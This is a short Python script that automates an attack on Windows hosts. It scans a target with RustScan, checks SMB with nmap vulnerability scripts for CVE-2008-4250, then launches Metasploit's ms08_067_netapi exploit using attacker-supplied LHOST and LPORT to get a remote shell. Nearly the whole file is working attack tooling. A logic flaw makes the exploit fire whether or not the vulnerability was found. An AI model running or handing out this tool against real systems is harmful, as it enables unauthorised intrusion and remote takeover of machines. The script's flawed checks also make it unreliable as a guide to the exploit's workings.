#!/usr/bin/python3

import os
import sys
import argparse
try:
    from colorama import Fore
except ImportError:
    os.system("pip3 install colorama")
    os.system("pip install colorama")

RED = Fore.RED
YELLOW = Fore.YELLOW
GREEN = Fore.GREEN
MAGENTA = Fore.MAGENTA
BLUE = Fore.BLUE
CYAN = Fore.CYAN
RESET = Fore.RESET

parser = argparse.ArgumentParser(description="SMB",
formatter_class=argparse.ArgumentDefaultsHelpFormatter)

parser = argparse.ArgumentParser(description="MS08-067", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
parser.add_argument("-r", "--RHOST", action="store", help="RHOST")
parser.add_argument("-p", "--RPORT", action="store", help="RPORT")
parser.add_argument("-P", "--LPORT", action="store", help="LPORT")
parser.add_argument("-l", "--LHOST", action="store", help="LHOST")

args = parser.parse_args()
parser.parse_args(args=None if sys.argv[1:] else ['--help'])

RHOST = args.RHOST
RPORT = args.RPORT
LPORT = args.LPORT
LHOST = args.LHOST

print(f"{GREEN}Running RustScan and saving to ports.txt")
with open("ports.txt", 'w') as f:
	os.system(f"rustscan -u 5000 -a {RHOST} -- -Pn > ports.txt")
with open("ports.txt", 'r') as f:
	content = f.read()
	words = "445"
	if words in content:
		print(f"{MAGENTA}Running more checks on SMB and saving to smb.txt")
		os.system(f"nmap -p 445 --script=smb-vuln* {RHOST} -Pn > smb.txt")
with open("smb.txt", "r") as f:
	content = f.read()
	words = "CVE-2008-4250"
	if words in content:
		print(f"{RED}Vulnerable to MS08-067, exploiting now")
EXPLOIT = f"msfconsole -x 'use exploit/windows/smb/ms08_067_netapi; set LHOST {LHOST}; set LPORT {LPORT}; set RHOST {RHOST}; set RPORT {RPORT}; exploit'"
print(f"{RED} Running Exploit{RESET}")
os.system(EXPLOIT)
